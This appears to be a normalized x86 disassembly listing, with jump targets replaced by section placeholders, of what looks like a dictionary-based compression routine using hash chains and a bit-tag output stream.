mov ebx [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
movzx ebx [ esi + edi ]
mov eax [ edx + 0x74 ]
cmp [ eax + ebx * 4 ] edi
jne r-xdata
mov eax [ edx + 0x28 ]
test eax eax
je r-xdata
movzx ebx [ eax ]
inc eax
mov [ edi + 0x1c ] eax
test ebx ebx
jns r-xdata
movzx edi [ esi + ecx ]
movzx eax [ esi + ecx + 0x1 ]
shl edi 0x5
xor eax edi
movzx edi [ esi + ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
mov ebx [ edi + eax * 4 ]
mov edi [ edx + 0x68 ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x64 ]
mov ebx [ ebp - 0x10 ]
mov [ edi + eax * 4 ] ecx
mov edi [ edx + 0x6c ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x70 ]
inc [ edi + eax * 4 ]
movzx edi [ esi + ecx ]
mov eax [ edx + 0x74 ]
mov [ eax + edi * 4 ] ecx
mov edi [ edx + 0x30 ]
mov eax [ edi + 0x1c ]
cmp eax [ edi + 0x24 ]
jae r-xdata
mov [ eax + ebx * 4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + eax ] bl
cmp eax [ edx + 0x4 ]
jae r-xdata
inc ecx
cmp ecx ebx
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ edx + 0x50 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
mov edi [ edx + 0x54 ]
mov [ eax + edi ] bl
jmp r-xdata
mov edi [ ebp - 0xc ]
inc edi
mov [ ebp - 0xc ] edi
cmp edi ebx
jne r-xdata
xor ecx ecx
dec [ ebp + 0x8 ]
jne r-xdata
xor edi edi
mov [ ebp - 0xc ] edi
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov esi [ ebp - 0x8 ]
mov [ edx + 0x4c ] edi
pop edi
mov [ edx + 0x58 ] esi
pop esi
mov [ edx + 0x48 ] ecx
mov [ edx + 0x44 ] eax
pop ebx
sub_403f80
push ebp
mov ebp esp
push ecx
mov edx [ esi + 0x20 ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x48 ]
add edi [ esi + 0x60 ]
cmp [ ebp + 0xc ] 0x0
mov al [ edi + edx - 0x1 ]
mov [ ebp - 0x1 ] al
jbe r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ ebp + 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov ebx [ eax + ebx * 4 ]
mov [ ebp + 0x8 ] ebx
ja r-xdata
mov cl [ eax + edx ]
cmp cl [ edi + edx ]
jne r-xdata
mov eax [ esi + 0x60 ]
mov cl [ ebp - 0x1 ]
dec [ ebp + 0xc ]
add eax ebx
cmp [ eax + edx - 0x1 ] cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edi ]
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
lea ecx [ edi + 0x2 ]
add eax 0x2
lea ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
sub ecx edi
cmp ecx edx
jbe r-xdata
mov bl [ ecx ]
inc eax
cmp bl [ eax ]
je r-xdata
mov edx ecx
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] ebx
cmp ecx [ esi + 0x28 ]
je r-xdata
mov ebx [ esi + 0x28 ]
inc ecx
add ebx edi
cmp ecx ebx
jae r-xdata
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov eax [ esi + 0x6c ]
cmp ecx [ eax + ebx * 4 ]
ja r-xdata
mov cl [ ecx + edi - 0x1 ]
mov [ ebp - 0x1 ] cl
sub_404020
mov edx [ eax + 0x48 ]
mov ecx [ eax + 0x60 ]
movzx ecx [ ecx + edx ]
mov edx [ eax + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
jne r-xdata
mov edx 0x2
cmp [ eax + 0x20 ] edx
jae r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov [ eax + 0x20 ] edx
mov [ eax + 0x34 ] ecx
sub_404050
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi eax
mov edx [ esi + 0x48 ]
mov eax [ esi + 0x60 ]
lea ecx [ edx + eax ]
movzx eax [ ecx ]
push edi
movzx edi [ ecx + 0x1 ]
shl eax 0x5
xor eax edi
movzx edi [ ecx + 0x2 ]
mov ebx [ esi + 0x68 ]
shl eax 0x5
xor eax edi
mov edi [ esi + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
lea edi [ edi + eax * 4 ]
mov [ ebp - 0x4 ] edi
mov edi [ edi ]
mov [ ebx + edx * 4 ] edi
mov [ ebp - 0x8 ] edi
mov edi [ esi + 0x70 ]
lea eax [ edi + eax * 4 ]
mov edi [ eax ]
lea ebx [ edi + 0x1 ]
mov [ eax ] ebx
mov eax [ esi + 0x10 ]
cmp edi eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ esi + 0x28 ]
mov [ eax ] edx
movzx eax [ ecx ]
mov [ esi + 0x2c ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jb r-xdata
test eax eax
je r-xdata
movzx ecx [ ecx ]
mov edx [ esi + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
mov edi eax
mov edi [ esi + 0x20 ]
cmp edi [ ebp - 0x4 ]
jbe r-xdata
cmp eax 0x2
jae r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x6c ]
inc ecx
mov [ esi + 0x24 ] 0x0
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov [ esi + 0x2c ] 0xffffffff
mov edx [ esi + 0x48 ]
mov ecx [ esi + 0x6c ]
mov [ ecx + edx * 4 ] edi
mov ecx [ esi + 0x48 ]
mov edx [ esi + 0x34 ]
cmp ecx edx
jbe r-xdata
cmp ebx 0x3
jb r-xdata
mov [ esi + 0x20 ] 0x2
mov [ esi + 0x34 ] ecx
mov eax [ esi + 0x58 ]
mov edi [ esi + 0x4c ]
test eax eax
jne r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov eax [ esi + 0x60 ]
movzx ebx [ edi + eax ]
lea ecx [ edi + eax ]
movzx eax [ ecx + 0x1 ]
shl ebx 0x5
xor eax ebx
movzx ebx [ ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ esi + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ esi + 0x74 ]
cmp [ ecx + eax * 4 ] edi
lea eax [ ecx + eax * 4 ]
jne r-xdata
mov eax [ esi + 0x50 ]
sub eax edx
add eax ecx
sub ecx edx
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push edi
push eax
call sub_403f80
add esp 0x8
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] 0xffffffff
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x24 ] eax
sub_4041d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ eax ] 0x1
mov [ esi + 0x30 ] eax
mov [ eax + 0x14 ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x7c ] edi
mov [ eax + 0x78 ] edi
mov [ eax + 0x74 ] edi
mov [ eax + 0x88 ] edi
mov [ eax + 0x84 ] edi
mov [ eax + 0x80 ] edi
mov [ eax + 0x8c ] edi
call sub_403ab0
mov ebx eax
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
pop edi
mov [ esi + 0x18 ] eax
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_403cd0
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_404240
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
sub esi eax
mov ecx esi
sub ecx eax
push ecx
mov edx ebx
call sub_403e30
sub esi [ ebp + 0x8 ]
add esp 0x4
inc esi
jmp r-xdata
mov ecx [ ebx + 0x28 ]
inc ecx
mov [ edi + 0x4 ] ecx
mov esi ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_403cd0
jmp r-xdata
add [ edi + 0x74 ] esi
mov eax ebx
mov [ ebx + 0x20 ] 0x1
call sub_404050
mov eax [ ebx + 0x24 ]
mov edx [ ebx + 0x20 ]
mov [ edi + 0xc ] eax
mov eax ebx
mov [ edi + 0x8 ] edx
call sub_403d50
xor eax eax
cmp [ ebx + 0x2c ] eax
jge r-xdata
xor eax eax
pop ebp
retn
mov ecx [ edi + 0x74 ]
cmp ecx [ edi + 0x7c ]
jbe r-xdata
mov edx [ edi + 0x1c ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x70 ]
mov [ edi + 0x18 ] edx
pop esi
test eax eax
je r-xdata
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
mov edx [ edi + 0x78 ]
push 0x3
push edx
push ecx
call eax
add esp 0x10
add [ edi + 0x7c ] 0x400
sub_4042e0
push esi
xor esi esi
cmp edx 0xffffffff
je r-xdata
cmp eax 0xffffffff
je r-xdata
cmp edx esi
je r-xdata
mov [ ecx + 0x2c ] esi
mov [ ecx + 0x30 ] esi
mov [ ecx + 0x40 ] esi
mov [ ecx + 0x44 ] esi
xor eax eax
pop esi
retn
cmp eax 0x8
je r-xdata
mov [ ecx + 0x34 ] esi
or eax 0xffffffff
pop esi
retn
mov [ ecx + 0x38 ] eax
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ecx + 0x3c ] eax
cmp eax 0x10
je r-xdata
cmp eax 0x20
jne r-xdata
sub_404330
mov ecx [ esi + 0x40 ]
mov eax [ esi + 0x2c ]
mov [ ecx ] al
cmp [ esi + 0x38 ] 0x10
jb r-xdata
retn
mov edx eax
shr edx 0x8
mov [ ecx + 0x1 ] dl
cmp [ esi + 0x38 ] 0x20
jne r-xdata
mov edx eax
shr edx 0x10
shr eax 0x18
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x3 ] al
sub_404360
mov ecx [ eax + 0x30 ]
push esi
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] edi
mov [ eax + 0x30 ] 0x1
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edi + edx * 2 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
sub_4043e0
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
mov [ eax + 0x40 ] 0x0
retn
push esi
cmp ecx [ eax + 0x38 ]
je r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
xor ecx ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x40 ] ecx
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
add edx edx
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jne r-xdata
sub_4044b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2
jb r-xdata
and edi 0x1
call sub_404360
mov edi 0x1
call sub_404360
pop edi
pop ebp
retn
push ebx
add edi 0x2
push esi
mov esi 0x4
mov [ ebp + 0x8 ] edi
lea ecx [ ecx ]
add esi esi
cmp edi esi
jae r-xdata
shr esi 0x1
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ edi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ edi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
shl [ eax + 0x2c ] 0x1
inc ecx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx edi
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ edi + 0x2 ] dl
mov [ edi + 0x3 ] cl
mov edi [ ebp + 0x8 ]
cmp esi 0x2
ja r-xdata
sub_4045e0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2
jb r-xdata
and edi 0x1
call sub_404360
mov edi 0x1
call sub_404360
pop edi
pop ebp
retn
push ebx
push esi
mov esi 0x2
sub edi esi
add esi esi
add esi esi
cmp edi esi
jae r-xdata
mov [ ebp + 0x8 ] edi
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ edi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ edi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
shl [ eax + 0x2c ] 0x1
inc ecx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ edi + 0x2 ] dl
mov [ edi + 0x3 ] cl
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx edi
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov edi [ ebp + 0x8 ]
mov [ eax + 0x2c ] ecx
cmp esi 0x2
ja r-xdata
sub_404780
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x54 ]
cmp ebx eax
jbe r-xdata
mov eax [ esi + 0x6c ]
add [ esi + 0x84 ] ebx
cmp ebx [ eax + 0xc ]
jbe r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
add eax 0xfffffffd
push eax
push esi
call sub_404780
mov eax [ esi + 0x54 ]
mov edx 0x3
sub edx eax
add ebx edx
add esp 0xc
cmp ebx eax
ja r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0x4 ]
jbe r-xdata
mov [ eax + 0xc ] ebx
push edi
xor edi edi
mov eax esi
call sub_404360
mov eax [ ebp + 0x10 ]
mov ecx 0x500
cmp ecx eax
sbb edx edx
neg edx
or ecx 0xffffffff
sub ecx edx
add ebx ecx
cmp ebx 0x4
sbb edi edi
and edi ebx
mov [ ebp + 0x8 ] edi
cmp eax [ esi + 0x14 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
dec eax
shr eax 0x7
inc eax
push eax
mov eax esi
call sub_4045e0
mov al [ ebp + 0x10 ]
mov edx [ esi + 0x44 ]
dec al
add al al
add esp 0x4
cmp edi 0x1
setbe cl
or al cl
mov [ edx ] al
inc [ esi + 0x44 ]
mov eax esi
xor edi edi
mov eax esi
call sub_404360
mov edi 0x1
call sub_404360
mov edx edi
cmp edx [ ebp + 0x8 ]
sbb edi edi
neg edi
call sub_404360
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x14 ] ecx
pop esi
pop ebx
pop ebp
retn
add ebx 0xfffffffc
push ebx
mov eax esi
call sub_4044b0
mov eax [ ebp + 0x10 ]
add esp 0x4
mov [ esi + 0x14 ] eax
pop esi
pop ebx
pop ebp
retn
and edi 0x1
call sub_404360
pop edi
cmp ebx 0x4
jb r-xdata
sub_404880
push ebp
mov ebp esp
push edi
mov edi ecx
test edi edi
je r-xdata
pop edi
pop ebp
retn
mov ecx [ eax + 0x6c ]
add [ eax + 0x80 ] edi
cmp edi [ ecx + 0x14 ]
jbe r-xdata
push ebx
push esi
mov ebx 0x1
mov [ ecx + 0x14 ] edi
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edx + edx + 0x1 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov esi [ ebp + 0x8 ]
mov dl [ esi ]
mov ecx [ eax + 0x44 ]
mov [ ecx ] dl
add [ eax + 0x44 ] ebx
add esi ebx
sub edi ebx
mov [ ebp + 0x8 ] esi
jne r-xdata
sub_404930
cmp edx 0x2
jb r-xdata
or eax 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x50 ]
ja r-xdata
cmp ecx 0x500
ja r-xdata
push esi
mov esi 0x500
cmp esi ecx
sbb esi esi
push edi
neg esi
mov edi 0xfffffffe
sub edi esi
add edx edi
pop edi
pop esi
cmp ecx [ eax + 0x14 ]
jne r-xdata
dec ecx
shr ecx 0x7
mov eax 0xa
test ecx ecx
je r-xdata
mov eax 0x3
jmp r-xdata
add eax 0x2
cmp edx 0x3
jb r-xdata
shr ecx 0x2
add eax 0x3
test ecx ecx
jne r-xdata
retn
sub edx 0x3
lea ebx [ ebx ]
add eax 0x2
shr edx 0x1
jne r-xdata
retn
sub_4049a0
push ebp
mov ebp esp
sub esp 0x170
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
lea ecx [ eax - 0x1 ]
mov ebx edx
cmp ecx 0x9
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0xfffffffe
pop ebx
call sub_40b946
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax * 8 ]
push 0x90
sub esi eax
lea edx [ ebp - 0xd4 ]
push 0x0
lea esi [ esi * 4 + r--data ]
push edx
mov [ ebp - 0xdc ] esi
call sub_4105f0
or eax 0xffffffff
lea ecx [ ebp - 0x44 ]
push 0x40
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
lea eax [ ebx + edi ]
mov [ ebp - 0xb4 ] edi
mov [ ebp - 0xb8 ] edi
mov edi [ ebp + 0x8 ]
mov edx ecx
push 0x0
push edx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] edi
mov [ ebp - 0x68 ] ecx
call sub_4105f0
mov ecx [ ebp - 0x68 ]
or eax 0xffffffff
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x68 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8c ]
xor eax eax
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x88 ]
add esp 0x18
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x9c ] 0x8
mov [ ebp - 0x98 ] 0x1
call sub_4042e0
test eax eax
jne r-xdata
pop esi
pop edi
mov eax 0xfffffffe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xb8 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0xe0 ] edx
mov [ ebp - 0x90 ] edi
mov edx 0x800
cmp eax 0x800
jae r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp - 0x16c ] edx
cmp eax 0x800000
jb r-xdata
mov edx eax
mov ecx [ ebp - 0x84 ]
mov edi 0xffff
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x164 ] edi
cmp ecx 0xffffffff
je r-xdata
mov eax 0x800000
cmp ebx eax
jae r-xdata
mov eax 0x800000
cmp ecx 0x800000
jae r-xdata
cmp edx 0x8
jb r-xdata
mov eax ebx
cmp ebx 0x100
jae r-xdata
mov [ ebp - 0x170 ] eax
mov eax ecx
cmp eax 0x100
jb r-xdata
mov [ ebp - 0x170 ] eax
mov eax 0x100
mov eax [ esi + 0x14 ]
push eax
lea ecx [ ebp - 0x170 ]
lea eax [ ebp - 0xd4 ]
call sub_4041d0
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x164 ] edi
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x160 ] eax
mov eax [ ebp - 0x80 ]
cmp eax [ ebp - 0x15c ]
jae r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x64 ]
test eax eax
je r-xdata
mov [ ebp - 0x15c ] eax
push 0x0
xor eax eax
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc0 ] 0x1
call sub_404240
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push 0xffffffff
push 0x0
push 0x0
call edx
add esp 0x10
cmp [ ebp - 0xd0 ] eax
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_404880
xor edi edi
call sub_404360
push 0x1000000
call sub_4045e0
mov eax [ ebp - 0x90 ]
mov [ eax ] 0xff
inc [ ebp - 0x90 ]
add esp 0x8
lea eax [ ebp - 0xd4 ]
call sub_4043e0
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
mov edx [ ebp - 0xf0 ]
mov ecx eax
mov [ edx ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] ecx
test eax eax
je r-xdata
mov edi [ ebp - 0xcc ]
jmp r-xdata
lea esi [ ebp - 0x170 ]
call sub_403cd0
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push 0x4
push ecx
mov ecx [ ebp - 0x60 ]
push ecx
call edx
add esp 0x10
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
cmp [ ebp - 0xd8 ] 0x0
mov ecx [ ebp - 0xc8 ]
